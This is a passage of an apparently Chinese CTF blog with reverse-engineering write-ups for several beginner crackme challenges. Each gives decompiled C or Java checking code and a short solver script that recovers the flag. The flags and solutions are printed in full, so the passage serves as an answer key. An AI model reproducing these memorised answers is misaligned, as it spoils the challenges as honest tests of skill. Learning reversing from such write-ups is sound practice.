n4 != <span class="hljs-number">4</span> )<br>LABEL_13:<br>          exit(<span class="hljs-number">1</span>);<br>        ++v4;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( n4 != <span class="hljs-number">1</span> )<br>        goto LABEL_13;<br>      --*(_DWORD *)&amp;_11110100001010000101111_[<span class="hljs-number">25</span>];<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">1</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( *(_DWORD *)&amp;_11110100001010000101111_[<span class="hljs-number">4</span> * i + <span class="hljs-number">25</span>] &gt; 4u )<br>        exit(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v7[<span class="hljs-number">5</span> * *(_DWORD *)&amp;_11110100001010000101111_[<span class="hljs-number">25</span>] - <span class="hljs-number">41</span> + v4] == <span class="hljs-string">&#x27;1&#x27;</span> )<br>      exit(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> ( v7[<span class="hljs-number">5</span> * *(_DWORD *)&amp;_11110100001010000101111_[<span class="hljs-number">25</span>] - <span class="hljs-number">41</span> + v4] == <span class="hljs-string">&#x27;#&#x27;</span> )<br>    &#123;<br>      puts(<span class="hljs-string">&quot;\nok, the order you enter is the flag!&quot;</span>);<br>      exit(<span class="hljs-number">0</span>);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 自己画画或者写个脚本都行</span><br>flag&#123;<span class="hljs-number">222441144222</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a><font style="color:rgb(33, 37, 41);">SimpleRev</font></h1><blockquote><p>考点</p><ul><li>凯撒</li><li>动调</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python">unsigned __int64 Decry()<br>&#123;<br>  char n10; // [rsp+Fh] [rbp-51h]<br>  <span class="hljs-built_in">int</span> v2; // [rsp+10h] [rbp-50h]<br>  <span class="hljs-built_in">int</span> v3; // [rsp+14h] [rbp-4Ch]<br>  <span class="hljs-built_in">int</span> i; // [rsp+18h] [rbp-48h]<br>  <span class="hljs-built_in">int</span> i_1; // [rsp+1Ch] [rbp-44h]<br>  char src[<span class="hljs-number">8</span>]; // [rsp+20h] [rbp-40h] BYREF<br>  __int64 v7; // [rsp+28h] [rbp-38h]<br>  <span class="hljs-built_in">int</span> v8; // [rsp+30h] [rbp-30h]<br>  _QWORD v9[<span class="hljs-number">2</span>]; // [rsp+40h] [rbp-20h] BYREF<br>  <span class="hljs-built_in">int</span> v10; // [rsp+50h] [rbp-10h]<br>  unsigned __int64 v11; // [rsp+58h] [rbp-8h]<br><br>  v11 = __readfsqword(0x28u);<br>  *(_QWORD *)src = 0x534C43444ELL;<br>  v7 = 0LL;<br>  v8 = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">0</span>] = 0x776F646168LL;<br>  v9[<span class="hljs-number">1</span>] = 0LL;<br>  v10 = <span class="hljs-number">0</span>;<br>  text = (char *)join(<br>                   key3,                        // <span class="hljs-string">&quot;kills&quot;</span><br>                   v9);<br>  strcpy(key, key1);                            // <span class="hljs-string">&quot;ADSFK&quot;</span><br>  strcat(key, src);<br>  v2 = <span class="hljs-number">0</span>;<br>  v3 = <span class="hljs-number">0</span>;<br>  getchar();<br>  i_1 = strlen(key);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; i_1; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( key[v3 % i_1] &gt; <span class="hljs-number">64</span> &amp;&amp; key[v3 % i_1] &lt;= <span class="hljs-number">90</span> )<br>      key[i] = key[v3 % i_1] + <span class="hljs-number">32</span>;<br>    ++v3;<br>  &#125;<br>  printf(<span class="hljs-string">&quot;Please input your flag:&quot;</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    n10 = getchar();<br>    <span class="hljs-keyword">if</span> ( n10 == <span class="hljs-number">10</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( n10 == <span class="hljs-number">32</span> )<br>    &#123;<br>      ++v2;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( n10 &lt;= <span class="hljs-number">96</span> || n10 &gt; <span class="hljs-number">122</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( n10 &gt; <span class="hljs-number">64</span> &amp;&amp; n10 &lt;= <span class="hljs-number">90</span> )<br>        &#123;<br>          str2[v2] = (n10 - <span class="hljs-number">39</span> - key[v3 % i_1] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>          ++v3;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        str2[v2] = (n10 - <span class="hljs-number">39</span> - key[v3 % i_1] + <span class="hljs-number">97</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>        ++v3;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( !(v3 % i_1) )<br>        putchar(<span class="hljs-number">32</span>);<br>      ++v2;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( !strcmp(text, str2) )<br>    puts(<span class="hljs-string">&quot;Congratulation!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    puts(<span class="hljs-string">&quot;Try again!\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(0x28u) ^ v11;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># EXP</span><br><br><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-comment">#include&lt;string.h&gt;</span><br>char enc[<span class="hljs-number">11</span>] = <span class="hljs-string">&quot;killshadow&quot;</span>;<br>char key[<span class="hljs-number">11</span>] = <span class="hljs-string">&quot;ADSFKNDCLS&quot;</span>;<br><span class="hljs-built_in">int</span> main()&#123;<br>    size_t count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; key[i]; i++) &#123;<br>        key[i] += <span class="hljs-number">32</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; strlen(enc); i++) &#123;<br>        <span class="hljs-keyword">for</span> (size_t alp = <span class="hljs-string">&#x27;A&#x27;</span>; alp &lt;= <span class="hljs-string">&#x27;z&#x27;</span>; alp++) &#123;<br>            char ans = alp;<br>            ans = (ans - <span class="hljs-number">39</span> - key[i] + <span class="hljs-number">97</span>)% <span class="hljs-number">26</span> + <span class="hljs-number">97</span>;<br>            <span class="hljs-keyword">if</span>(ans == enc[i])&#123;<br>                printf(<span class="hljs-string">&quot;%c&quot;</span>,alp);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="GXYCTF2019-luck-guy"><a href="#GXYCTF2019-luck-guy" class="headerlink" title="[GXYCTF2019]luck_guy"></a><font style="color:rgb(33, 37, 41);">[GXYCTF2019]luck_guy</font></h1><blockquote><p>考点</p><ul><li>调试，逻辑理解</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python">unsigned __int64 get_flag()<br>&#123;<br>  unsigned <span class="hljs-built_in">int</span> seed; // eax<br>  <span class="hljs-built_in">int</span> i; // [rsp+4h] [rbp-3Ch]<br>  <span class="hljs-built_in">int</span> j; // [rsp+8h] [rbp-38h]<br>  __int64 s; // [rsp+10h] [rbp-30h] BYREF<br>  char v5; // [rsp+18h] [rbp-28h]<br>  unsigned __int64 v6; // [rsp+38h] [rbp-8h]<br><br>  v6 = __readfsqword(0x28u);<br>  seed = time(0LL);<br>  srand(seed);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>  &#123;<br>    switch ( rand() % <span class="hljs-number">200</span> )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        puts(<span class="hljs-string">&quot;OK, it&#x27;s flag:&quot;</span>);<br>        memset(&amp;s, <span class="hljs-number">0</span>, 0x28uLL);<br>        strcat((char *)&amp;s, f1);                 // <span class="hljs-string">&quot;GXY&#123;do_not_&quot;</span><br>        strcat((char *)&amp;s, &amp;f2);<br>        printf(<span class="hljs-string">&quot;%s&quot;</span>, (const char *)&amp;s);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        printf(<span class="hljs-string">&quot;Solar not like you&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        printf(<span class="hljs-string">&quot;Solar want a girlfriend&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        s = 0x7F666F6067756369LL;<br>        v5 = <span class="hljs-number">0</span>;<br>        strcat(&amp;f2, (const char *)&amp;s);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">7</span>; ++j )<br>        &#123;<br>          <span class="hljs-keyword">if</span> ( j % <span class="hljs-number">2</span> == <span class="hljs-number">1</span> )<br>            *(&amp;f2 + j) -= <span class="hljs-number">2</span>;<br>          <span class="hljs-keyword">else</span><br>            --*(&amp;f2 + j);<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      default:<br>        puts(<span class="hljs-string">&quot;emmm,you can&#x27;t find flag 23333&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(0x28u) ^ v6;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 程序是有问题的，f2的空间只有1，无法构成一个flag，所以得自己组合，正常循序（case）应该是4，5，1</span><br>enc = [<span class="hljs-number">0x69</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x7F</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>:<br>        enc[i] -= <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        enc[i] -= <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;do_not_&#x27;</span>+<span class="hljs-built_in">bytes</span>(enc).decode())<br><br><span class="hljs-comment"># flag&#123;do_not_hate_me&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Java逆向解密"><a href="#Java逆向解密" class="headerlink" title="Java逆向解密"></a><font style="color:rgb(33, 37, 41);">Java逆向解密</font></h1><blockquote><p>考点</p><ul><li>java类，class文件</li><li>反编译有很多jeb，jadx、ide都可以</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">Reverse</span> &#123;<br>    public static void Encrypt(char[] arr_c) &#123;<br>        ArrayList arrayList0 = new ArrayList();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> v1 = <span class="hljs-number">0</span>; v1 &lt; arr_c.length; ++v1) &#123;<br>            arrayList0.add(Integer.valueOf(arr_c[v1] + <span class="hljs-number">0x40</span> ^ <span class="hljs-number">0x20</span>));<br>        &#125;<br><br>        ArrayList arrayList1 = new ArrayList();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> v = <span class="hljs-number">0</span>; v &lt; <span class="hljs-number">18</span>; ++v) &#123;<br>            arrayList1.add(Integer.valueOf(new <span class="hljs-built_in">int</span>[]&#123;<span class="hljs-number">180</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">140</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">65</span>&#125;[v]));<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;Result:&quot;</span>);<br>        <span class="hljs-keyword">if</span>(arrayList0.equals(arrayList1)) &#123;<br>            System.out.println(<span class="hljs-string">&quot;Congratulations！&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        System.err.println(<span class="hljs-string">&quot;Error！&quot;</span>);<br>    &#125;<br><br>    public static void main(String[] arr_s) &#123;<br>        Scanner scanner0 = new Scanner(System.<span class="hljs-keyword">in</span>);<br>        System.out.println(<span class="hljs-string">&quot;Please input the flag ：&quot;</span>);<br>        String s = scanner0.<span class="hljs-built_in">next</span>();<br>        System.out.println(<span class="hljs-string">&quot;Your input is ：&quot;</span>);<br>        System.out.println(s);<br>        Reverse.Encrypt(s.toCharArray());<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>enc = [<span class="hljs-number">180</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">140</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">65</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    enc[i] ^= <span class="hljs-number">0x20</span><br>    enc[i] -= <span class="hljs-number">0x40</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="BJDCTF2020-JustRE"><a href="#BJDCTF2020-JustRE" class="headerlink" title="[BJDCTF2020]JustRE"></a><font style="color:rgb(33, 37, 41);">[BJDCTF2020]JustRE</font></h1><blockquote><p>考点</p><ul><li>win32API类</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">INT_PTR __stdcall DialogFunc(HWND hWnd, UINT n273, WPARAM n2, LPARAM a4)<br>&#123;<br>  CHAR Buffer[<span class="hljs-number">100</span>]; // [esp+0h] [ebp-64h] BYREF<br><br>  <span class="hljs-keyword">if</span> ( n273 != <span class="hljs-number">272</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( n273 != <span class="hljs-number">273</span> )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( (_WORD)n2 != <span class="hljs-number">1</span> &amp;&amp; (_WORD)n2 != <span class="hljs-number">2</span> )<br>    &#123;<br>      sprintf(Buffer, &amp;Format, ++n19999);<br>      <span class="hljs-keyword">if</span> ( n19999 == <span class="hljs-number">19999</span> )<br>      &#123;<br>        sprintf(Buffer, <span class="hljs-string">&quot; BJD&#123;%d%d2069a45792d233ac&#125;&quot;</span>, <span class="hljs-number">19999</span>, <span class="hljs-number">0</span>);<br>        SetWindowTextA(hWnd, Buffer);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>      &#125;<br>      SetWindowTextA(hWnd, Buffer);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    EndDialog(hWnd, (unsigned __int16)n2);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br>flag&#123;1999902069a45792d233ac&#125;<br></code></pre></td></tr></table></figure><h1 id="刮开有奖"><a href="#刮开有奖" class="headerlink" title="刮开有奖"></a><font style="color:rgb(33, 37, 41);">刮开有奖</font></h1><blockquote><p>考点</p><ul><li>win32API类</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python">a1[<span class="hljs-number">0</span>] = <span class="hljs-number">90</span>;<br>      a1[<span class="hljs-number">1</span>] = <span class="hljs-number">74</span>;<br>      a1[<span class="hljs-number">2</span>] = <span class="hljs-number">83</span>;<br>      a1[<span class="hljs-number">3</span>] = <span class="hljs-number">69</span>;<br>      a1[<span class="hljs-number">4</span>] = <span class="hljs-number">67</span>;<br>      a1[<span class="hljs-number">5</span>] = <span class="hljs-number">97</span>;<br>      a1[<span class="hljs-number">6</span>] = <span class="hljs-number">78</span>;<br>      a1[<span class="hljs-number">7</span>] = <span class="hljs-number">72</span>;<br>      a1[<span class="hljs-number">8</span>] = <span class="hljs-number">51</span>;<br>      a1[<span class="hljs-number">9</span>] = <span class="hljs-number">110</span>;<br>      a1[<span class="hljs-number">10</span>] = <span class="hljs-number">103</span>;<br>      sub_FE10F0(a1, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>);<br>      memset(v9, <span class="hljs-number">0</span>, 0xFFFFu);<br>      v9[<span class="hljs-number">0</span>] = String[<span class="hljs-number">5</span>];<br>      v9[<span class="hljs-number">2</span>] = String[<span class="hljs-number">7</span>];<br>      v9[<span class="hljs-number">1</span>] = String[<span class="hljs-number">6</span>];<br>      v4 = (const char *)sub_FE1000(v9, strlen(v9));<br>      memset(v9, <span class="hljs-number">0</span>, 0xFFFFu);<br>      v9[<span class="hljs-number">1</span>] = String[<span class="hljs-number">3</span>];<br>      v9[<span class="hljs-number">0</span>] = String[<span class="hljs-number">2</span>];<br>      v9[<span class="hljs-number">2</span>] = String[<span class="hljs-number">4</span>];<br>      v5 = (const char *)sub_FE1000(v9, strlen(v9));<br>      <span class="hljs-keyword">if</span> ( String[<span class="hljs-number">0</span>] == a1[<span class="hljs-number">0</span>] + <span class="hljs-number">34</span><br>        &amp;&amp; String[<span class="hljs-number">1</span>] == a1[<span class="hljs-number">4</span>]<br>        &amp;&amp; <span class="hljs-number">4</span> * String[<span class="hljs-number">2</span>] - <span class="hljs-number">141</span> == <span class="hljs-number">3</span> * a1[<span class="hljs-number">2</span>]<br>        &amp;&amp; String[<span class="hljs-number">3</span>] / <span class="hljs-number">4</span> == <span class="hljs-number">2</span> * (a1[<span class="hljs-number">7</span>] / <span class="hljs-number">9</span>)<br>        &amp;&amp; !strcmp(v4, <span class="hljs-string">&quot;ak1w&quot;</span>)<br>        &amp;&amp; !strcmp(v5, <span class="hljs-string">&quot;V1Ax&quot;</span>) )<br>      &#123;<br>        MessageBoxA(hDlg, <span class="hljs-string">&quot;U g3t 1T!&quot;</span>, <span class="hljs-string">&quot;@_@&quot;</span>, MB_OK);<br>      &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 根据逻辑逆推即可，这里注意配合东条调试过sub_FE10F0函数获取enc</span><br><span class="hljs-keyword">import</span> base64<br>enc = [<span class="hljs-number">0x00000033</span>, <span class="hljs-number">0x00000043</span>, <span class="hljs-number">0x00000045</span>, <span class="hljs-number">0x00000048</span>, <span class="hljs-number">0x0000004A</span>, <span class="hljs-number">0x0000004E</span>, <span class="hljs-number">0x00000053</span>, <span class="hljs-number">0x0000005A</span>, <span class="hljs-number">0x00000061</span>, <span class="hljs-number">0x00000067</span>, <span class="hljs-number">0x0000006E</span>]<br><br>String = [<span class="hljs-number">0</span>]*<span class="hljs-number">11</span><br>String[<span class="hljs-number">0</span>] = enc[<span class="hljs-number">0</span>] + <span class="hljs-number">34</span><br>String[<span class="hljs-number">1</span>] = enc[<span class="hljs-number">4</span>]<br>String[<span class="hljs-number">2</span>] = (<span class="hljs-number">3</span> * enc[<span class="hljs-number">2</span>] + <span class="hljs-number">141</span>) // <span class="hljs-number">4</span><br>String[<span class="hljs-number">3</span>] = <span class="hljs-number">8</span> * (enc[<span class="hljs-number">7</span>] // <span class="hljs-number">9</span>)<br><br>tmp = <span class="hljs-string">&#x27;V1Ax&#x27;</span><br>tmpp = <span class="hljs-built_in">list</span>(base64.b64decode(tmp))<br>String[<span class="hljs-number">2</span>] = tmpp[<span class="hljs-number">0</span>]<br>String[<span class="hljs-number">3</span>] = tmpp[<span class="hljs-number">1</span>]<br>String[<span class="hljs-number">4</span>] = tmpp[<span class="hljs-number">2</span>]<br><br>tmp = <span class="hljs-string">&#x27;ak1w&#x27;</span><br>tmpp = <span class="hljs-built_in">list</span>(base64.b64decode(tmp))<br>String[<span class="hljs-number">5</span>] = tmpp[<span class="hljs-number">0</span>]<br>String[<span class="hljs-number">6</span>] = tmpp[<span class="hljs-number">1</span>]<br>String[<span class="hljs-number">7</span>] = tmpp[<span class="hljs-number">2</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-built_in">bytes</span>(String).decode()+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br><span class="hljs-comment"># flag&#123;UJWP1jMp&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a><font style="color:rgb(33, 37, 41);">[ACTF新生赛2020]easyre</font></h1><blockquote><p>考点</p><ul><li>upx脱壳</li><li>寻表</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 